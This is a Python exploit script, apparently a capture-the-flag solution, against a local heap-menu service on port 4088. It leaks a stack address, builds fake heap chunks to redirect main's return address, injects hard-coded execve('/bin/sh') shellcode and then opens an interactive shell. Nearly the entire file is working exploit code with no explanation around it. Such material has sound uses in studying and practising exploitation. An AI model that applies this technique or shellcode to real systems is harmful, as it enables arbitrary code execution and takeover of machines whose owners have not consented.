import socket, struct, telnetlib


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


def command(func):
    def wrapper(*args, **kwargs):
        args_str = '({})'.format(','.join(map(str, args)))
        print func.__name__ + args_str
        ret = func(*args, **kwargs)
        return ret
    return wrapper


s, f = sock("127.0.0.1", 4088)

def skip_menu():
    read_until(f, '| ')

@command
def alloc(size):
    skip_menu()
    f.write('A\n')
    read_until(f, 'Size:' )
    f.write('{}\n'.format(size))

@command
def free(index):
    skip_menu()
    f.write('F\n')
    lists = read_until(f, 'Index: ')
    print lists
    lists = lists.split('\n')
    addr_heap = int(lists[0].split()[1], 16)

    f.write('{}\n'.format(index))
    return addr_heap

@command
def write(where, what):
    skip_menu()
    f.write('W\n')
    read_until(f, 'where: ')
    f.write('{}\n'.format(where))
    read_until(f, 'what: ')
    f.write('{}'.format(what))

@command
def nice():
    skip_menu()
    f.write('N\n')
    out = read_until(f).rstrip()
    return int(out.split()[-1], 16)


@command
def exit():
    skip_menu()
    f.write('E\n')


shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"


addr_ret_offset = 0x13c
addr_stack = nice()
addr_ret_addr = addr_stack + addr_ret_offset
print '[+] addr_stack = {}'.format(hex(addr_stack))
print '[+] addr_ret_addr = {}'.format(hex(addr_ret_addr))


alloc(16)
alloc(128)
alloc(16)

addr_heap = free(2)
free(1)

alloc(128 + 16)

buf = ''
# Fake chunk 1
buf += p64(addr_ret_addr - addr_heap) # fake offset size to address of retrurn address
buf += 'A' * 8

# Fake chunk 2
buf += p64(16 | 1 | 2)
buf += 'B' * 16

# Fake chunk
buf += p64(16 | 2)
buf += p64(addr_heap)

write(4, buf)

# After this the return address from main will point to chunk 2
free(2)

buf = 'A' * 0x10
buf += shellcode
write(4, buf)

shell(s)
